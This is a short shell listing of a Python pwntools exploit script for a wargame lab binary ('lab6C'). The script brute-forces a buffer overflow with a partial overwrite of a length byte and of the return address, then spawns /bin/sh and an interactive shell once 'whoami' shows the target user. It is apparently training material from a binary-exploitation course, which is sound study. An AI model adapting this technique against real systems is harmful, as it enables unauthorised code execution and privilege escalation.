#lab6C@warzone:/levels/lab06$ cat /tmp/exploit_lab6C.py
from pwn import *
 
while True:
 
  p = process("./lab6C")
  p.recv(200)
 
  p.sendline("X"*40+"\xc6") # 196 offset + 2 byte partial overwrite = 198 (0xc6)
  p.recv(200)
 
  expl = "X"*196
  expl += p32(0x072b)
  p.sendline(expl)
  p.sendline("/bin/sh")
  p.sendline("whoami")
 
  ret = p.recv(200)
 
  if ("alex" in ret):
    p.interactive()
    quit()
